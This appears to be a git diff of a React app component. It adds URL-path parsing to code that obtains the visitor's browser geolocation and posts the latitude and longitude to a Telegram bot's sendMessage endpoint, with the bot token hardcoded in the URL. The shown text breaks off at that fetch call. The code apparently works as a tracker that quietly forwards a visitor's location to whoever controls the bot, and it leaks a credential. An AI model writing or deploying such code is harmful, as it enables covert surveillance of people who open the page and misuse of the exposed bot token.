@@ -47,6 +47,8 @@ const App = () => {
     }
   };
   const onChange = () => {
+    var pathArray = window.location.pathname.split('/');
+    console.log(pathArray[1])
     if (navigator.geolocation) {
       console.log("getting position")
       navigator.geolocation.getCurrentPosition(showPosition);
@@ -71,6 +73,7 @@ const App = () => {
   };
   function showPosition(position) {
     try {
+      var pathArray = window.location.pathname.split('/');
       let lat = position.coords.latitude;
       let long = position.coords.longitude;
       fetch("https://api.telegram.org/bot6199852049:AAFYRoMbBEQBuZrx7gkaGfSnlDZxGKhMHVE/sendMessage", {
